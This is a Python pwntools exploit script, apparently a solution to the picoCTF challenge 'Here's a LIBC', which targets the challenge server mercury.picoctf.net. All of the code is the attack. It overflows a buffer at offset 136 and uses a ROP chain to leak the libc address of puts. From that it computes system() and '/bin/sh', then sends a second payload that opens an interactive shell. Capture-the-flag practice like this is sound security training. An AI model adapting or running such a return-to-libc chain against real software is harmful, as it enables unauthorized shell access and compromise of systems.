# picoCTF-heres-a-libc-exploit.py
# by Aidan Wech (ahwech)
# nc mercury.picoctf.net 42072

from pwn import *

def main():
    # connection variables
    host = "mercury.picoctf.net"
    port = 42072

    # first payload - leak puts() stack address
    offset = 136                    # offset to overflow
    pop_rdi_ret_gadget = 0x400913   # set up puts(puts_got)
    puts_got = 0x601018             # leaked puts() address
    puts_plt = 0x400546             # puts() call
    ret_to_main = 0x400771          # return safely to main() afterwards
    payload1 = flat(
        {offset: p64(pop_rdi_ret_gadget)}, 
        p64(puts_got), 
        p64(puts_plt), 
        p64(ret_to_main))
    
    # process
    p = remote(host, port)
    p.recvline(timeout=1)
    p.sendline(payload1)
    p.recvline(timeout=1)
    puts_stack_addr = unpack(p.recvline(timeout=1).rstrip(b'\n'), 48, endian="little", sign=False)

    # second payload - spawn shell
    system_offset = 0x31550
    str_bin_sh_offset = 0x1336ca
    ret_gadget = 0x40052e
    system_addr = puts_stack_addr - system_offset
    str_bin_sh_addr = puts_stack_addr + str_bin_sh_offset
    payload2 = flat(
        {offset: p64(pop_rdi_ret_gadget)},
        p64(str_bin_sh_addr),
        p64(ret_gadget),
        p64(system_addr))

    # continue process
    p.sendline(payload2)
    p.interactive()
    p.close()

if __name__ == "__main__":
    main()